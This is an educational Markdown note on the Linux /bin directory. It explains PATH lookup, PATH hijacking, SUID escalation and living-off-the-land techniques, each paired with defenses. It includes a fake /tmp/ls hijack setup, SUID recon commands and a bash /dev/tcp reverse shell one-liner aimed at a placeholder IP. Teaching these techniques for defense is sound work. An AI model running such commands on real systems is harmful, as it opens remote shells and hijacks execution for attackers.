# 📁 bin.md — The `/bin` Directory

## 🧠 What `/bin` REALLY is

`/bin` contains **essential executable programs (binaries)** required for:

* Basic system usage
* Shell operations
* Recovery mode

These are actual **program files**, not scripts.

---

## 🧠 What Happens When You Type a Command

Example:

```bash
ls
```

### Step-by-step:

1. Your shell (e.g. `/bin/bash`) receives `ls`
2. It checks an environment variable called `PATH`
3. It searches directories in order:

```bash
echo $PATH
```

Example output:

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

4. It finds:

```
/bin/ls
```

5. It executes that binary

---

👉 **Important Concept:**
Linux does NOT know “ls”
It only knows `/bin/ls`

---

# 🔐 ATTACK 1: PATH HIJACKING (FULL MECHANICS)

## 🧠 Idea

The system executes the **first matching binary in PATH**

---

## ⚙️ Step-by-step Attack

### Step 1: Attacker creates fake binary

```bash
echo 'echo HACKED' > /tmp/ls
chmod +x /tmp/ls
```

---

### Step 2: Modify PATH

```bash
export PATH=/tmp:$PATH
```

Now PATH becomes:

```
/tmp:/usr/local/sbin:/usr/local/bin:...
```

---

### Step 3: Victim runs:

```bash
ls
```

---

### Step 4: What actually happens:

* System checks `/tmp` FIRST
* Finds `/tmp/ls`
* Executes attacker’s version

---

### Result:

Instead of real `ls`, attacker controls execution

---

## 🔐 Why This Works

* Linux trusts PATH order
* It does NOT verify binaries are legitimate

---

## 🔐 Real Impact

Attacker can:

* Log commands
* Steal credentials
* Execute hidden payloads
* Maintain persistence

---

## 🛡️ Defense

* Never include writable directories (like `/tmp`) in PATH
* Use absolute paths:

```bash
/bin/ls
```

---

# 🔐 ATTACK 2: SUID BINARIES (FULL MECHANICS)

## 🧠 What is SUID?

SUID = **Set User ID**

If a binary has SUID:

👉 It runs with the **owner’s privileges**, not the user’s

---

## ⚙️ Example

Check SUID binaries:

```bash
find /bin -perm -4000 2>/dev/null
```

---

Example output:

```
/bin/passwd
```

---

## 🧠 What happens internally

Normal:

* You run command → runs as YOU

With SUID:

* You run command → runs as OWNER (usually root)

---

## ⚙️ Real Example

```bash
ls -l /bin/passwd
```

Output:

```
-rwsr-xr-x root root /bin/passwd
```

Notice:

```
rws
```

👉 The `s` = SUID

---

## 🧠 Why `/bin/passwd` Needs SUID

When you change your password:

* It must write to `/etc/shadow`
* Only root can do that

So it temporarily runs as root

---

## 🔐 Where It Becomes Dangerous

If a SUID binary has a flaw:

👉 You can trick it into executing code

---

## ⚙️ Example Attack Concept

1. Find vulnerable SUID binary
2. Abuse it to spawn shell:

```bash
./vulnerable_binary
```

3. It gives:

```
root shell
```

---

## 🔐 Real Impact

* Instant privilege escalation
* No password needed
* Full system compromise

---

## 🛡️ Defense

* Audit SUID binaries regularly:

```bash
find / -perm -4000 2>/dev/null
```

* Remove unnecessary ones
* Patch vulnerable software

---

# 🔐 ATTACK 3: LIVING OFF THE LAND (LOLBins)

## 🧠 Idea

Attackers don’t always bring malware

👉 They use tools already in `/bin`

---

## ⚙️ Example: Reverse Shell

```bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

---

## 🧠 Step-by-step Explanation

### `bash -i`

* Starts interactive shell

---

### `>& /dev/tcp/IP/4444`

* Redirects output to attacker’s machine
* `/dev/tcp` = special Linux feature for network connections

---

### `0>&1`

* Redirects input back to attacker

---

## 🧠 What This Achieves

* Attacker gets remote shell
* No file dropped
* No antivirus trigger

---

## 🔐 Why This Is Dangerous

* Uses trusted binary (`/bin/bash`)
* No malware needed
* Hard to detect

---

## 🛡️ Defense

* Monitor unusual shell activity
* Restrict outbound connections
* Use EDR tools

---

# ⚠️ WHY `/bin` IS A HIGH-VALUE TARGET

Because:

* Every command runs from here
* System trusts these binaries
* Users rarely verify them

---

## 🔐 If `/bin` is Compromised

Attacker can:

* Replace commands
* Hide files
* Log activity
* Maintain persistence

---

# 🛡️ DEFENSE STRATEGY

### 1. Protect permissions

```bash
chmod 755 /bin
chown root:root /bin
```

---

### 2. Verify binaries

```bash
sha256sum /bin/bash
```

---

### 3. Monitor integrity

Tools:

* AIDE
* Tripwire

---

### 4. Avoid unsafe PATH

Never include:

* `/tmp`
* writable directories

---

# 🧪 RECON COMMANDS

```bash
ls -la /bin
ls -ld /bin
echo $PATH
find /bin -perm -4000 2>/dev/null
find /bin -writable 2>/dev/null
```

---

# 🧠 FINAL MENTAL MODEL

* `/bin` = execution engine
* PATH = execution search order
* SUID = privilege bridge
* LOLBins = stealth attack method

---

# 📌 FINAL TRUTH

If attacker controls `/bin`:

* They control what commands DO
* They control what you SEE
* They control system behavior

👉 `/bin` compromise = **execution-level takeover**
